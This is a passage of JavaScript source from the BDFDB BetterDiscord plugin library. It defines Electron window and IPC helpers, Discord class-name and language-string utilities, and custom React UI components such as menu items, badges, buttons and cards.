					BDFDB.PatchUtils.patch({name: "BDFDB DiscordUtils"}, ShakeablePrototype, "render", {after: e => {
						e.returnValue.props.children = typeof e.returnValue.props.children == "function" ? (_ => {return null;}) : [];
						BDFDB.ReactUtils.forceUpdate(ShakeableIns);
					}}, {once: true});
					BDFDB.ReactUtils.forceUpdate(ShakeableIns);
				}
			}, instant ? 0 : 1000);
		};

		BDFDB.WindowUtils = {};
		BDFDB.WindowUtils.open = function (plugin, url, config = {}) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !url || !Internal.LibraryRequires.electron || !Internal.LibraryRequires.electron.remote) return;
			if (!BDFDB.ArrayUtils.is(plugin.browserWindows)) plugin.browserWindows = [];
			config = Object.assign({
				show: false,
				webPreferences: {
					nodeIntegration: true,
					nodeIntegrationInWorker: true
				}
			}, config);
			let browserWindow = new Internal.LibraryRequires.electron.remote.BrowserWindow(BDFDB.ObjectUtils.exclude(config, "showOnReady", "onLoad"));
			
			if (!config.show && config.showOnReady) browserWindow.once("ready-to-show", browserWindow.show);
			if (config.devTools) browserWindow.openDevTools();
			if (typeof config.onLoad == "function") browserWindow.webContents.on("did-finish-load", (...args) => {config.onLoad(...args);});
			if (typeof config.onClose == "function") browserWindow.once("closed", (...args) => {config.onClose(...args);});
			
			if (typeof browserWindow.removeMenu == "function") browserWindow.removeMenu();
			else browserWindow.setMenu(null);
			browserWindow.loadURL(url);
			browserWindow.executeJavaScriptSafe = js => {if (!browserWindow.isDestroyed()) browserWindow.webContents.executeJavaScript(`(_ => {${js}})();`);};
			plugin.browserWindows.push(browserWindow);
			return browserWindow;
		};
		BDFDB.WindowUtils.close = function (browserWindow) {
			if (BDFDB.ObjectUtils.is(browserWindow) && !browserWindow.isDestroyed() && browserWindow.isClosable()) browserWindow.close();
		};
		BDFDB.WindowUtils.closeAll = function (plugin) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ArrayUtils.is(plugin.browserWindows)) return;
			while (plugin.browserWindows.length) BDFDB.WindowUtils.close(plugin.browserWindows.pop());
		};
		BDFDB.WindowUtils.addListener = function (plugin, actions, callback) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !actions || typeof callback != "function") return;
			BDFDB.WindowUtils.removeListener(plugin, actions);
			for (let action of actions.split(" ")) {
				action = action.split(".");
				let eventName = action.shift();
				if (!eventName) return;
				let namespace = (action.join(".") || "") + plugin.name;
				if (!BDFDB.ArrayUtils.is(plugin.ipcListeners)) plugin.ipcListeners = [];

				plugin.ipcListeners.push({eventName, namespace, callback});
				Internal.LibraryRequires.electron.ipcRenderer.on(eventName, callback);
			}
		};
		BDFDB.WindowUtils.removeListener = function (plugin, actions = "") {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ArrayUtils.is(plugin.ipcListeners)) return;
			if (actions) {
				for (let action of actions.split(" ")) {
					action = action.split(".");
					let eventName = action.shift();
					let namespace = (action.join(".") || "") + plugin.name;
					for (let listener of plugin.ipcListeners) {
						let removedListeners = [];
						if (listener.eventName == eventName && listener.namespace == namespace) {
							Internal.LibraryRequires.electron.ipcRenderer.off(listener.eventName, listener.callback);
							removedListeners.push(listener);
						}
						if (removedListeners.length) plugin.ipcListeners = plugin.ipcListeners.filter(listener => {return removedListeners.indexOf(listener) < 0;});
					}
				}
			}
			else {
				for (let listener of plugin.ipcListeners) Internal.LibraryRequires.electron.ipcRenderer.off(listener.eventName, listener.callback);
				plugin.ipcListeners = [];
			}
		};
		
		const DiscordClassModules = Object.assign({}, InternalData.CustomClassModules);
		Internal.DiscordClassModules = new Proxy(DiscordClassModules, {
			get: function (_, item) {
				if (DiscordClassModules[item]) return DiscordClassModules[item];
				if (!InternalData.DiscordClassModules[item]) return;
				DiscordClassModules[item] = BDFDB.ModuleUtils.findStringObject(InternalData.DiscordClassModules[item].props, Object.assign({}, InternalData.DiscordClassModules[item]));
				return DiscordClassModules[item] ? DiscordClassModules[item] : undefined;
			}
		});
		BDFDB.DiscordClassModules = Internal.DiscordClassModules;
		
		const DiscordClasses = Object.assign({}, InternalData.DiscordClasses);
		BDFDB.DiscordClasses = Object.assign({}, DiscordClasses);
		Internal.getDiscordClass = function (item, selector) {
			let className, fallbackClassName;
			className = fallbackClassName = Internal.DiscordClassModules.BDFDB.BDFDBundefined + "-" + Internal.generateClassId();
			if (DiscordClasses[item] === undefined) {
				BDFDB.LogUtils.warn([item, "not found in DiscordClasses"]);
				return className;
			} 
			else if (!BDFDB.ArrayUtils.is(DiscordClasses[item]) || DiscordClasses[item].length != 2) {
				BDFDB.LogUtils.warn([item, "is not an Array of Length 2 in DiscordClasses"]);
				return className;
			}
			else if (Internal.DiscordClassModules[DiscordClasses[item][0]] === undefined) {
				BDFDB.LogUtils.warn([DiscordClasses[item][0], "not found in DiscordClassModules"]);
				return className;
			}
			else if ([DiscordClasses[item][1]].flat().every(prop => Internal.DiscordClassModules[DiscordClasses[item][0]][prop] === undefined)) {
				BDFDB.LogUtils.warn([DiscordClasses[item][1], "not found in", DiscordClasses[item][0], "in DiscordClassModules"]);
				return className;
			}
			else {
				for (let prop of [DiscordClasses[item][1]].flat()) {
					className = Internal.DiscordClassModules[DiscordClasses[item][0]][prop];
					if (className) break;
					else className = fallbackClassName;
				}
				if (selector) {
					className = className.split(" ").filter(n => n.indexOf("da-") != 0).join(selector ? "." : " ");
					className = className || fallbackClassName;
				}
				return BDFDB.ArrayUtils.removeCopies(className.split(" ")).join(" ") || fallbackClassName;
			}
		};
		const generationChars = "0123456789ABCDEFGHIJKMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_".split("");
		Internal.generateClassId = function () {
			let id = "";
			while (id.length < 6) id += generationChars[Math.floor(Math.random() * generationChars.length)];
			return id;
		};
		BDFDB.disCN = new Proxy(DiscordClasses, {
			get: function (list, item) {
				return Internal.getDiscordClass(item, false).replace("#", "");
			}
		});
		BDFDB.disCNS = new Proxy(DiscordClasses, {
			get: function (list, item) {
				return Internal.getDiscordClass(item, false).replace("#", "") + " ";
			}
		});
		BDFDB.disCNC = new Proxy(DiscordClasses, {
			get: function (list, item) {
				return Internal.getDiscordClass(item, false).replace("#", "") + ",";
			}
		});
		BDFDB.dotCN = new Proxy(DiscordClasses, {
			get: function (list, item) {
				let className = Internal.getDiscordClass(item, true);
				return (className.indexOf("#") == 0 ? "" : ".") + className;
			}
		});
		BDFDB.dotCNS = new Proxy(DiscordClasses, {
			get: function (list, item) {
				let className = Internal.getDiscordClass(item, true);
				return (className.indexOf("#") == 0 ? "" : ".") + className + " ";
			}
		});
		BDFDB.dotCNC = new Proxy(DiscordClasses, {
			get: function (list, item) {
				let className = Internal.getDiscordClass(item, true);
				return (className.indexOf("#") == 0 ? "" : ".") + className + ",";
			}
		});
		BDFDB.notCN = new Proxy(DiscordClasses, {
			get: function (list, item) {
				return `:not(.${Internal.getDiscordClass(item, true).split(".")[0]})`;
			}
		});
		BDFDB.notCNS = new Proxy(DiscordClasses, {
			get: function (list, item) {
				return `:not(.${Internal.getDiscordClass(item, true).split(".")[0]}) `;
			}
		});
		BDFDB.notCNC = new Proxy(DiscordClasses, {
			get: function (list, item) {
				return `:not(.${Internal.getDiscordClass(item, true).split(".")[0]}),`;
			}
		});
	
		const LanguageStrings = Internal.LibraryModules.LanguageStore && Internal.LibraryModules.LanguageStore._proxyContext ? Object.assign({}, Internal.LibraryModules.LanguageStore._proxyContext.defaultMessages) : {};
		const LibraryStrings = Object.assign({}, InternalData.LibraryStrings);
		BDFDB.LanguageUtils = {};
		BDFDB.LanguageUtils.languages = Object.assign({}, InternalData.Languages);
		BDFDB.LanguageUtils.getLanguage = function () {
			let lang = Internal.LibraryModules.LanguageStore.chosenLocale || Internal.LibraryModules.LanguageStore._chosenLocale || BDFDB.DiscordUtils.getSettings("locale") || "en";
			if (lang == "en-GB" || lang == "en-US") lang = "en";
			let langIds = lang.split("-");
			let langId = langIds[0];
			let langId2 = langIds[1] || "";
			lang = langId2 && langId.toUpperCase() !== langId2.toUpperCase() ? langId + "-" + langId2 : langId;
			return BDFDB.LanguageUtils.languages[lang] || BDFDB.LanguageUtils.languages[langId] || BDFDB.LanguageUtils.languages.en;
		};
		BDFDB.LanguageUtils.getName = function (language) {
			if (!language || typeof language.name != "string") return "";
			if (language.name.startsWith("Discord")) return language.name.slice(0, -1) + (language.ownlang && (BDFDB.LanguageUtils.languages[language.id] || {}).name != language.ownlang ? ` / ${language.ownlang}` : "") + ")";
			else return language.name + (language.ownlang && language.name != language.ownlang ? ` / ${language.ownlang}` : "");
		};
		BDFDB.LanguageUtils.LanguageStrings = new Proxy(LanguageStrings, {
			get: function (list, item) {
				let stringObj = Internal.LibraryModules.LanguageStore.Messages[item];
				if (!stringObj) BDFDB.LogUtils.warn([item, "not found in BDFDB.LanguageUtils.LanguageStrings"]);
				else {
					if (stringObj && typeof stringObj == "object" && typeof stringObj.format == "function") return BDFDB.LanguageUtils.LanguageStringsFormat(item);
					else return stringObj;
				}
				return "";
			}
		});
		BDFDB.LanguageUtils.LanguageStringsCheck = new Proxy(LanguageStrings, {
			get: function (list, item) {
				return !!Internal.LibraryModules.LanguageStore.Messages[item];
			}
		});
		let parseLanguageStringObj = obj => {
			let string = "";
			if (typeof obj == "string") string += obj;
			else if (BDFDB.ObjectUtils.is(obj)) {
				if (obj.content) string += parseLanguageStringObj(obj.content);
				else if (obj.children) string += parseLanguageStringObj(obj.children);
				else if (obj.props) string += parseLanguageStringObj(obj.props);
			}
			else if (BDFDB.ArrayUtils.is(obj)) for (let ele of obj) string += parseLanguageStringObj(ele);
			return string;
		};
		BDFDB.LanguageUtils.LanguageStringsFormat = function (item, ...values) {
			if (item) {
				let stringObj = Internal.LibraryModules.LanguageStore.Messages[item];
				if (stringObj && typeof stringObj == "object" && typeof stringObj.format == "function") {
					let i = 0, returnvalue, formatVars = {};
					while (!returnvalue && i < 10) {
						i++;
						try {returnvalue = stringObj.format(formatVars, false);}
						catch (err) {
							returnvalue = null;
							let value = values.shift();
							formatVars[err.toString().split("for: ")[1]] = value != null ? (value === 0 ? "0" : value) : "undefined";
							if (stringObj.intMessage) {
								try {for (let hook of stringObj.intMessage.format(formatVars).match(/\([^\(\)]+\)/gi)) formatVars[hook.replace(/[\(\)]/g, "")] = n => n;}
								catch (err2) {}
							}
						}
					}
					if (returnvalue) return parseLanguageStringObj(returnvalue);
					else {
						BDFDB.LogUtils.warn([item, "failed to format string in BDFDB.LanguageUtils.LanguageStrings"]);
						return "";
					}
				}
				else return BDFDB.LanguageUtils.LanguageStrings[item];
			}
			else BDFDB.LogUtils.warn([item, "enter a valid key to format the string in BDFDB.LanguageUtils.LanguageStrings"]);
			return "";
		};
		BDFDB.LanguageUtils.LibraryStrings = new Proxy(LibraryStrings.default || {}, {
			get: function (list, item) {
				let languageId = BDFDB.LanguageUtils.getLanguage().id;
				if (LibraryStrings[languageId] && LibraryStrings[languageId][item]) return LibraryStrings[languageId][item];
				else if (LibraryStrings.default[item]) return LibraryStrings.default[item];
				else BDFDB.LogUtils.warn([item, "not found in BDFDB.LanguageUtils.LibraryStrings"]);
				return "";
			}
		});
		BDFDB.LanguageUtils.LibraryStringsCheck = new Proxy(LanguageStrings, {
			get: function (list, item) {
				return !!LibraryStrings.default[item];
			}
		});
		BDFDB.LanguageUtils.LibraryStringsFormat = function (item, ...values) {
			if (item) {
				let languageId = BDFDB.LanguageUtils.getLanguage().id, string = null;
				if (LibraryStrings[languageId] && LibraryStrings[languageId][item]) string = LibraryStrings[languageId][item];
				else if (LibraryStrings.default[item]) string = LibraryStrings.default[item];
				if (string) {
					for (let i = 0; i < values.length; i++) if (typeof values[i] == "string" || typeof values[i] == "number") string = string.replace(new RegExp(`{{var${i}}}`, "g"), values[i]);
					return string;
				}
				else BDFDB.LogUtils.warn([item, "not found in BDFDB.LanguageUtils.LibraryStrings"]);
			}
			else BDFDB.LogUtils.warn([item, "enter a valid key to format the string in BDFDB.LanguageUtils.LibraryStrings"]);
			return "";
		};
		BDFDB.TimeUtils.interval(interval => {
			if (Internal.LibraryModules.LanguageStore.chosenLocale || Internal.LibraryModules.LanguageStore._chosenLocale || BDFDB.DiscordUtils.getSettings("locale")) {
				BDFDB.TimeUtils.clear(interval);
				let language = BDFDB.LanguageUtils.getLanguage();
				if (language) BDFDB.LanguageUtils.languages.$discord = Object.assign({}, language, {name: `Discord (${language.name})`});
			}
		}, 100);
		for (let key in BDFDB.LanguageUtils.languages) try {
			if (new Date(0).toLocaleString(key, {second: 'numeric'}) != "0") {
				BDFDB.LanguageUtils.languages[key].numberMap = {};
				for (let i = 0; i < 10; i++) BDFDB.LanguageUtils.languages[key].numberMap[i] = new Date(i*1000).toLocaleString(key, {second: 'numeric'});
			}
		}
		catch (err) {}
		
		const reactInitialized = Internal.LibraryModules.React && Internal.LibraryModules.React.Component;
		Internal.setDefaultProps = function (component, defaultProps) {
			if (BDFDB.ObjectUtils.is(component)) component.defaultProps = Object.assign({}, component.defaultProps, defaultProps);
		};
		let openedItem;
		Internal.MenuItem = reactInitialized && class BDFDB_MenuItem extends Internal.LibraryModules.React.Component {
			constructor(props) {
				super(props);
				this.state = {hovered: false};
			}
			componentWillUnmount() {
				if (openedItem == this.props.id) openedItem = null;
			}
			render() {
				let color = (typeof this.props.color == "string" ? this.props.color : Internal.LibraryComponents.MenuItems.Colors.DEFAULT).toLowerCase();
				let isCustomColor = false;
				if (color) {
					if (DiscordClasses[`menu${color}`]) color = color;
					else if (BDFDB.ColorUtils.getType(color)) {
						isCustomColor = true;
						color = BDFDB.ColorUtils.convert(color, "RGBA");
					}
					else color = (Internal.LibraryComponents.MenuItems.Colors.DEFAULT || "").toLowerCase();
				}
				let renderPopout, onClose, hasPopout = BDFDB.ObjectUtils.is(this.props.popoutProps);
				if (hasPopout) {
					renderPopout = instance => {
						openedItem = this.props.id;
						return typeof this.props.popoutProps.renderPopout == "function" && this.props.popoutProps.renderPopout(instance);
					};
					onClose = instance => {
						openedItem = null;
						typeof this.props.popoutProps.onClose == "function" && this.props.popoutProps.onClose(instance);
					};
				}
				let focused = !openedItem ? this.props.isFocused : openedItem == this.props.id;
				let themeDark = BDFDB.DiscordUtils.getTheme() == BDFDB.disCN.themedark;
				let item = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, Object.assign({
					className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.menuitem, (this.props.label || this.props.subtext) && BDFDB.disCN.menulabelcontainer, color && (isCustomColor ? BDFDB.disCN.menucolorcustom : BDFDB.disCN[`menu${color}`]), this.props.disabled && BDFDB.disCN.menudisabled, focused && BDFDB.disCN.menufocused),
					style: {
						color: isCustomColor ? ((focused || this.state.hovered) ? (BDFDB.ColorUtils.isBright(color) ? "#000000" : "#ffffff") : color) : (this.state.hovered ? "#ffffff" : null),
						background: isCustomColor && (focused || this.state.hovered) && color
					},
					onClick: this.props.disabled ? null : e => {
						if (!this.props.action) return false;
						!this.props.persisting && !hasPopout && this.props.onClose();
						this.props.action(e, this);
					},
					onMouseEnter: this.props.disabled ? null : e => {
						if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);
						this.setState({hovered: true});
					},
					onMouseLeave: this.props.disabled ? null : e => {
						if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);
						this.setState({hovered: false});
					},
					"aria-disabled": this.props.disabled,
					children: [
						typeof this.props.render == "function" ? this.props.render(this) : this.props.render,
						(this.props.label || this.props.subtext) && BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.menulabel,
							children: [
								typeof this.props.label == "function" ? this.props.label(this) : this.props.label,
								this.props.subtext && BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.disCN.menusubtext,
									children: typeof this.props.subtext == "function" ? this.props.subtext(this) : this.props.subtext
								})
							].filter(n => n)
						}),
						this.props.hint && BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.menuhintcontainer,
							children: typeof this.props.hint == "function" ? this.props.hint(this) : this.props.hint
						}),
						this.props.icon && BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.menuiconcontainer,
							children: BDFDB.ReactUtils.createElement(this.props.icon, {
								className: BDFDB.disCN.menuicon
							})
						}),
						this.props.imageUrl && BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.menuimagecontainer,
							children: BDFDB.ReactUtils.createElement("img", {
								className: BDFDB.disCN.menuimage,
								src: typeof this.props.imageUrl == "function" ? this.props.imageUrl(this) : this.props.imageUrl,
								alt: ""
							})
						})
					].filter(n => n)
				}, this.props.menuItemProps, {isFocused: focused}));
				return hasPopout ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutContainer, Object.assign({}, this.props.popoutProps, {
					children: item,
					renderPopout: renderPopout,
					onClose: onClose
				})) : item;
			}
		};
		Internal.CustomMenuItemWrapper = reactInitialized && class BDFDB_CustomMenuItemWrapper extends Internal.LibraryModules.React.Component {
			constructor(props) {
				super(props);
				this.state = {hovered: false};
			}
			render() {
				let isItem = this.props.children == Internal.MenuItem;
				let item = BDFDB.ReactUtils.createElement(this.props.children, Object.assign({}, this.props.childProps, {
					onMouseEnter: isItem ? e => {
						if (this.props.childProps && typeof this.props.childProps.onMouseEnter == "function") this.props.childProps.onMouseEnter(e, this);
						this.setState({hovered: true});
					} : this.props.childProps && this.props.childProps.onMouseEnter,
					onMouseLeave: isItem ? e => {
						if (this.props.childProps && typeof this.props.childProps.onMouseLeave == "function") this.props.childProps.onMouseLeave(e, this);
						this.setState({hovered: false});
					} : this.props.childProps && this.props.childProps.onMouseLeave,
					isFocused: this.state.hovered && !this.props.disabled
				}));
				return isItem ? item : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
					onMouseEnter: e => {
						this.setState({hovered: true});
					},
					onMouseLeave: e => {
						this.setState({hovered: false});
					},
					children: item
				});
			}
		};
		Internal.ErrorBoundary = reactInitialized && class BDFDB_ErrorBoundary extends Internal.LibraryModules.React.PureComponent {
			constructor(props) {
				super(props);
				this.state = {hasError: false};
			}
			static getDerivedStateFromError(err) {
				return {hasError: true};
			}
			componentDidCatch(err, info) {
				BDFDB.LogUtils.error(["Could not create React Element!", err]);
			}
			render() {
				if (this.state.hasError) return Internal.LibraryModules.React.createElement("span", {
					style: {
						background: BDFDB.DiscordConstants && BDFDB.DiscordConstants.Colors && BDFDB.DiscordConstants.Colors.PRIMARY_DARK,
						borderRadius: 5,
						color: BDFDB.DiscordConstants && BDFDB.DiscordConstants.Colors && BDFDB.DiscordConstants.Colors.STATUS_RED,
						fontSize: 12,
						fontWeight: 600,
						padding: 6,
						textAlign: "center",
						verticalAlign: "center"
					},
					children: "React Component Error"
				});
				return this.props.children;
			}
		};
		
		const loadComponents = _ => {
			const CustomComponents = {};
			
			CustomComponents.AutoFocusCatcher = reactInitialized && class BDFDB_AutoFocusCatcher extends Internal.LibraryModules.React.Component {
				render() {
					const style = {padding: 0, margin: 0, border: "none", width: 0, maxWidth: 0, height: 0, maxHeight: 0, visibility: "hidden"};
					return BDFDB.ReactUtils.forceStyle(BDFDB.ReactUtils.createElement("input", {style}), Object.keys(style));
				}
			};
			
			CustomComponents.BadgeAnimationContainer = reactInitialized && class BDFDB_BadgeAnimationContainer extends Internal.LibraryModules.React.Component {
				componentDidMount() {BDFDB.ReactUtils.forceUpdate(this);}
				componentWillAppear(e) {if (typeof e == "function") e();}
				componentWillEnter(e) {if (typeof e == "function") e();}
				componentWillLeave(e) {if (typeof e == "function") this.timeoutId = setTimeout(e, 300);}
				componentWillUnmount() {BDFDB.TimeUtils.clear(this.timeoutId)}
				render() {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.div, {
						className: this.props.className,
						style: this.props.animatedStyle,
						children: this.props.children
					});
				}
			};
			
			CustomComponents.Badges = {};
			CustomComponents.Badges.getBadgePaddingForValue = function (count) {
				switch (count) {
					case 1:
					case 4:
					case 6:
						return 1;
					default:
						return 0;
				}
			};
			CustomComponents.Badges.IconBadge = reactInitialized && class BDFDB_IconBadge extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.badgeiconbadge, this.props.shape && Internal.LibraryComponents.Badges.BadgeShapes[this.props.shape] || Internal.LibraryComponents.Badges.BadgeShapes.ROUND),
						style: Object.assign({
							backgroundColor: this.props.disableColor ? null : (this.props.color || BDFDB.DiscordConstants.Colors.STATUS_RED)
						}, this.props.style),
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
							className: BDFDB.disCN.badgeicon,
							name: this.props.icon
						})
					});
				}
			};
			CustomComponents.Badges.NumberBadge = reactInitialized && class BDFDB_NumberBadge extends Internal.LibraryModules.React.Component {
				handleClick(e) {if (typeof this.props.onClick == "function") this.props.onClick(e, this);}
				handleContextMenu(e) {if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);}
				handleMouseEnter(e) {if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);}
				handleMouseLeave(e) {if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);}
				render() {
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.badgenumberbadge, this.props.shape && Internal.LibraryComponents.Badges.BadgeShapes[this.props.shape] || Internal.LibraryComponents.Badges.BadgeShapes.ROUND),
						style: Object.assign({
							backgroundColor: !this.props.disableColor && (this.props.color || BDFDB.DiscordConstants.Colors.STATUS_RED),
							width: Internal.LibraryComponents.Badges.getBadgeWidthForValue(this.props.count),
							paddingRight: Internal.LibraryComponents.Badges.getBadgePaddingForValue(this.props.count)
						}, this.props.style),
						onClick: this.handleClick.bind(this),
						onContextMenu: this.handleContextMenu.bind(this),
						onMouseEnter: this.handleMouseEnter.bind(this),
						onMouseLeave: this.handleMouseLeave.bind(this),
						children: Internal.LibraryComponents.Badges.getBadgeCountString(this.props.count)
					});
				}
			};
			
			CustomComponents.BotTag = reactInitialized && class BDFDB_BotTag extends Internal.LibraryModules.React.Component {
				handleClick(e) {if (typeof this.props.onClick == "function") this.props.onClick(e, this);}
				handleContextMenu(e) {if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);}
				handleMouseEnter(e) {if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);}
				handleMouseLeave(e) {if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);}
				render() {
					return BDFDB.ReactUtils.createElement("span", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, this.props.invertColor ? BDFDB.disCN.bottaginvert : BDFDB.disCN.bottagregular, this.props.useRemSizes ? BDFDB.disCN.bottagrem : BDFDB.disCN.bottagpx),
						style: this.props.style,
						onClick: this.handleClick.bind(this),
						onContextMenu: this.handleContextMenu.bind(this),
						onMouseEnter: this.handleMouseEnter.bind(this),
						onMouseLeave: this.handleMouseLeave.bind(this),
						children: BDFDB.ReactUtils.createElement("span", {
							className: BDFDB.disCN.bottagtext,
							children: this.props.tag || BDFDB.LanguageUtils.LanguageStrings.BOT_TAG_BOT
						})
					});
				}
			};
			
			CustomComponents.Button = reactInitialized && class BDFDB_Button extends Internal.LibraryModules.React.Component {
				handleClick(e) {if (typeof this.props.onClick == "function") this.props.onClick(e, this);}
				handleContextMenu(e) {if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);}
				handleMouseDown(e) {if (typeof this.props.onMouseDown == "function") this.props.onMouseDown(e, this);}
				handleMouseUp(e) {if (typeof this.props.onMouseUp == "function") this.props.onMouseUp(e, this);}
				handleMouseEnter(e) {if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);}
				handleMouseLeave(e) {if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);}
				render() {
					let processingAndListening = (this.props.disabled || this.props.submitting) && (null != this.props.onMouseEnter || null != this.props.onMouseLeave);
					let props = BDFDB.ObjectUtils.exclude(this.props, "look", "color", "hover", "size", "fullWidth", "grow", "disabled", "submitting", "type", "style", "wrapperClassName", "className", "innerClassName", "onClick", "onContextMenu", "onMouseDown", "onMouseUp", "onMouseEnter", "onMouseLeave", "children", "rel");
					let button = BDFDB.ReactUtils.createElement("button", Object.assign({}, !this.props.disabled && !this.props.submitting && props, {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.button, this.props.look != null ? this.props.look : Internal.LibraryComponents.Button.Looks.FILLED, this.props.color != null ? this.props.color : Internal.LibraryComponents.Button.Colors.BRAND, this.props.hover, this.props.size != null ? this.props.size : Internal.LibraryComponents.Button.Sizes.MEDIUM, processingAndListening && this.props.wrapperClassName, this.props.fullWidth && BDFDB.disCN.buttonfullwidth, (this.props.grow === undefined || this.props.grow) && BDFDB.disCN.buttongrow, this.props.hover && this.props.hover !== Internal.LibraryComponents.Button.Hovers.DEFAULT && BDFDB.disCN.buttonhashover, this.props.submitting && BDFDB.disCN.buttonsubmitting),
						onClick: (this.props.disabled || this.props.submitting) ? e => {return e.preventDefault();} : this.handleClick.bind(this),
						onContextMenu: (this.props.disabled || this.props.submitting) ? e => {return e.preventDefault();} : this.handleContextMenu.bind(this),
						onMouseUp: !this.props.disabled && this.handleMouseDown.bind(this),
						onMouseDown: !this.props.disabled && this.handleMouseUp.bind(this),
						onMouseEnter: this.handleMouseEnter.bind(this),
						onMouseLeave: this.handleMouseLeave.bind(this),
						type: !this.props.type ? "button" : this.props.type,
						disabled: this.props.disabled,
						style: this.props.style,
						rel: this.props.rel,
						children: [
							this.props.submitting && !this.props.disabled ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Spinner, {
								type: Internal.LibraryComponents.Spinner.Type.PULSING_ELLIPSIS,
								className: BDFDB.disCN.buttonspinner,
								itemClassName: BDFDB.disCN.buttonspinneritem
							}) : null,
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.buttoncontents, this.props.innerClassName),
								children: this.props.children
							})
						]
					}));
					return !processingAndListening ? button : BDFDB.ReactUtils.createElement("span", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.buttondisabledwrapper, this.props.wrapperClassName, this.props.size != null ? this.props.size : Internal.LibraryComponents.Button.Sizes.MEDIUM, this.props.fullWidth && BDFDB.disCN.buttonfullwidth, (this.props.grow === undefined || this.props.grow) && BDFDB.disCN.buttongrow),
						children: [
							button,
							BDFDB.ReactUtils.createElement("span", {
								onMouseEnter: this.handleMouseEnter.bind(this),
								onMouseLeave: this.handleMouseLeave.bind(this),
								className: BDFDB.disCN.buttondisabledoverlay
							})
						]
					});
				}
			};
			
			CustomComponents.Card = reactInitialized && class BDFDB_Card extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement("div", BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.hovercardwrapper, this.props.horizontal && BDFDB.disCN.hovercardhorizontal, this.props.backdrop && BDFDB.disCN.hovercard, this.props.className),
						onMouseEnter: e => {if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);},
						onMouseLeave: e => {if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);},
						onClick: e => {if (typeof this.props.onClick == "function") this.props.onClick(e, this);},
						onContextMenu: e => {if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);},
						children: [
							!this.props.noRemove ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
								"aria-label": BDFDB.LanguageUtils.LanguageStrings.REMOVE,
								className: BDFDB.disCNS.hovercardremovebutton + BDFDB.disCNS.hovercardremovebuttondefault,
								onClick: e => {
									if (typeof this.props.onRemove == "function") this.props.onRemove(e, this);
									BDFDB.ListenerUtils.stopEvent(e);
								}
							}) : null,
							typeof this.props.children == "string" ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextElement, {
								className: BDFDB.disCN.hovercardinner,
								children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextScroller, {children: this.props.children})
							}) : this.props.children
						].flat(10).filter(n => n)
					}), "backdrop", "horizontal", "noRemove"));
				}
			};
			Internal.setDefaultProps(CustomComponents.Card, {backdrop: true, noRemove: false});
			
			CustomComponents.ChannelTextAreaButton = reactInitialized && class BDFDB_ChannelTextAreaButton extends Internal.LibraryModules.React.Component {
				render() {
					const inner = BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.textareabuttonwrapper,
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
							name: this.props.iconName,
							iconSVG: this.props.iconSVG,
							className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.textareaicon, this.props.iconClassName, this.props.pulse && BDFDB.disCN.textareaiconpulse),
							nativeClass: this.props.nativeClass
						})
					});
					const button = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Button, {
						look: Internal.LibraryComponents.Button.Looks.BLANK,
						size: Internal.LibraryComponents.Button.Sizes.NONE,
						"aria-label": this.props.label,
						tabIndex: this.props.tabIndex,
						className: BDFDB.DOMUtils.formatClassName(this.props.isActive && BDFDB.disCN.textareabuttonactive),
						innerClassName: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.textareabutton, this.props.className, this.props.pulse && BDFDB.disCN.textareaattachbuttonplus),
						onClick: this.props.onClick,
						onContextMenu: this.props.onContextMenu,
						onMouseEnter: this.props.onMouseEnter,
